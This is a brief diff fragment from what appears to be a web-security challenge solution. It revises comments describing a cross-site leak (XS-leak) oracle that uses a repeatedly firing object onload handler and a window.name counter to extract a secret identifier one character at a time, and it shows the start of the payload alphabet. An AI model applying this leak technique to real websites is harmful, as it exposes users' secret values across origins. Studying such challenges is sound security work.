@@ -14,10 +14,8 @@
     <script>
         // The idea is to create an oracle with onSMTH that can be repeated over and over
         // I used <object onload=> that can be repeated over and over because it triggers
-        // With every request. When the comparision is true, iframe.location++ is called
-        // which when same-origin will change the location. that is one of the possible
-        // xs-leaks of each character. there are probably plenty more solutions to leak
-        // the identifier though.
+        // With every request. When the comparision is true, top.name++ is called
+        // which when same-origin will change increase the window.name. 
 
         const alph = "0123456789abcdefghijklmnopqrstuvwxyz~"
         const payload = alph.split('').map(c =>
